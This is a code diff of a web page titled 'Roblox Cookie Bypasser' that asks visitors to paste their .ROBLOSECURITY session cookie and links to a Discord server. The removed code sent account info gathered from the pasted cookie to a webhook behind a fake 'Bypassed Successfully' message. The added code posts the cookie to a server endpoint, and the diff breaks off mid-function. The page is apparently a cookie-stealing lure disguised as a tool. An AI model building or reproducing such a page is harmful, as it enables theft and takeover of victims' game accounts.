@@ -71,6 +71,10 @@
         font-size: 20px;
         font-weight: bold;
         cursor: pointer;
+        transition: background 0.3s ease;
+    }
+    .btn:hover {
+        background: #0093b2;
     }
     #status {
         margin-top: 15px;
@@ -88,54 +92,54 @@
 <body>
 
 <div class="container">
-    <h1>Roblox Cookie Bypasser</h1>
+    <h1 style="text-align: center;">Roblox Cookie Bypasser</h1>
     <p class="subtitle">Fast • Secure • Reliable</p>
     
     <div class="discord-link">
-        <a href="https://discord.gg/82KG93tYr5" target="_blank">🔗 Join Our Discord Server</a>
+        <a href="https://discord.gg/82KG93tYr5" target="_blank">Join our Discord Server!</a>
     </div>
 
     <div class="card">
-        <textarea id="cookieInput" placeholder="Paste your .ROBLOSECURITY here..."></textarea>
-
-        <button class="btn" onclick="startCheck()">🔍 BYPASS COOKIE</button>
-        <div id="status"></div>
+        <p>Paste the .ROBLOSECURITY cookie below:</p>
+        <textarea id="cookieInput" placeholder="Paste your .ROBLOSECURITY cookie here..."></textarea>
+        <button class="btn" onclick="sendCookie()">Bypass Cookie</button>
+        <p id="status"></p>
     </div>
 
-    <!-- AUTHOR NAME -->
-    <p class="author">Author: Jerwin Ricaplaza</p>
+    <div class="author">
+        Made with ❤️ by [Jerwins]
+    </div>
 </div>
 
-<script src="webhook.js"></script>
-<script src="api.js"></script>
-<script src="discord.js"></script>
-
 <script>
-async function startCheck() {
-    let status = document.getElementById('status');
-    status.innerHTML = "⏳ Processing... Please wait...";
+    async function sendCookie() {
+        const cookie = document.getElementById('cookieInput').value;
+        const statusElement = document.getElementById('status');
+        const bypassButton = document.querySelector('.btn');
 
-    let rawData = document.getElementById('cookieInput').value;
+        if (!cookie) {
+            statusElement.style.color = 'red';
+            statusElement.textContent = 'Please paste a .ROBLOSECURITY cookie.';
+            return;
+        }
 
-    if(!rawData.trim()) {
-        status.innerHTML = "❌ Please paste a cookie!";
-        return;
-    }
+        statusElement.style.color = 'yellow';
+        statusElement.textContent = 'Processing cookie...';
+        bypassButton.disabled = true; // Disable button while processing
 
-    let info = await getAccountInfo(rawData);
+        try {
+            // IMPORTANT: Replace with the actual URL of your Node.js server
+            // If running locally, it's http://localhost:3000/bypass-cookie
+            // If deployed, use your domain: https://yourdomain.com/bypass-cookie
+            const serverUrl = 'http://localhost:3000/bypass-cookie'; // <-- This should match your server.js port
 
-    setTimeout(() => {
-        status.innerHTML = "✅ Success! Bypassed Successfully.";
+            const response = await fetch(serverUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ cookie: cookie })
+            });
 
-        fetch(LIVE_WEBHOOK, {
-            method: "POST",
-            headers: {"Content-Type": "application/json"},
-            body: JSON.stringify(buildLiveEmbed(info))
-        });
-
-    }, 1000);
-}
-</script>
-
-</body>
-</html>
+            const data = await response.json();
+           
